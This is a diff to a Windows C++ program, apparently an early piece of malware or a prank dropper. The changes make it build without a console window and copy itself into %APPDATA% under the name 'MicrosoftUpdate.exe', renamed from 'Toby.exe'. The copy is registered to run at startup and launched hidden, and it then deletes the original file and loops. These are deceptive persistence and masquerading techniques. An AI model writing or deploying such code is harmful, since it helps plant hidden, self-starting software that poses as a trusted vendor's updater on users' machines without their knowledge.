@@ -4,7 +4,7 @@
 #include "atlstr.h"
 #include <iostream>
 
-#define RELEASE 0
+#define RELEASE 1
 
 BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
 {
@@ -63,51 +63,70 @@ void copyApplicationToLocation(TCHAR* path){
 	CopyFile(buf, path, TRUE);
 }
 
+std::string utf8_encode(const std::wstring &wstr)
+{
+	if (wstr.empty()) return std::string();
+	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+	std::string strTo( size_needed, 0 );
+	WideCharToMultiByte                  (CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+	return strTo;
+}
 
+std::wstring utf8_decode(const std::string &str)
+{
+	if( str.empty() ) return std::wstring();
+	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+	std::wstring wstrTo(size_needed, 0);
+	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+	return wstrTo;
+}
 
 #if RELEASE
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
 #else
-int main(int argc, char** argv){
+int wmain(int argc, wchar_t ** argv){
 #endif
+
+	std::wcout << "Hello, Toby" << std::endl;
+
+#if RELEASE
+	LPWSTR* argv;
+	int argc;
+
+	argv = CommandLineToArgvW(GetCommandLine(), &argc);
+
+#endif
+
 
 	if (argc == 2){
 
-		wchar_t argv0[MAX_PATH];
-		wchar_t argv1[MAX_PATH];
+		DeleteFile(argv[1]);
+		while (1){
 
-		mbstowcs(argv0, argv[0], strlen(argv[0]) + 1);
-		mbstowcs(argv1, argv[1], strlen(argv[1]) + 1);
-
-		MessageBox(0, argv0, argv1, MB_OK);
+			Sleep(50);
+		}
 
 	}else{
 
 		WCHAR* appdata = _wgetenv(L"APPDATA");
 		TCHAR out[MAX_PATH];
-		_stprintf(out, L"%s\\Toby.exe", appdata);
+		_stprintf(out, L"%s\\MicrosoftUpdate.exe", appdata);
 
-		char newfile[MAX_PATH];
-		wcstombs(newfile, out, wcslen(out) + 1);
-
-		std::cout << "deleting " << newfile << " ..." << std::flush;
+		std::wcout << "deleting " << out << " ..." << std::flush;
 		DeleteFile(out);
-		std::cout << "done" << std::endl;
+		std::wcout << "done" << std::endl;
 
-		std::cout << "copying to  " << getenv("APPDATA") << " ..." << std::flush;
+		std::wcout << "copying to  " << getenv("APPDATA") << " ..." << std::flush;
 		copyApplicationToLocation(out);
-		std::cout << "done" << std::endl;
+		std::wcout << "done" << std::endl;
 
-		std::cout << "Registering program... " << std::flush;
+		std::wcout << "Registering program... " << std::flush;
 		RegisterProgram(out);
-		std::cout << "done" << std::endl;
+		std::wcout << "done" << std::endl;
 
-		std::cout << "Starting " << newfile << " " << argv[0] << " ... " << std::flush;
-		wchar_t* current = new wchar_t[MAX_PATH];
-		MultiByteToWideChar(CP_ACP, 0, argv[0], -1, current, MAX_PATH);
-		HINSTANCE err = ShellExecute(0, _T("open"), out, current, 0, SW_HIDE);
-		std::cout << " Error: " << err << std::endl;
-		std::cout << "done" << std::endl;
+		std::wcout << "Starting " << out << " " << argv[0] << " ... " << std::flush;
+		HINSTANCE err = ShellExecute(0, _T("open"), out, argv[0], 0, SW_HIDE);
+		std::wcout << "done" << std::endl;
 
 	}
 	
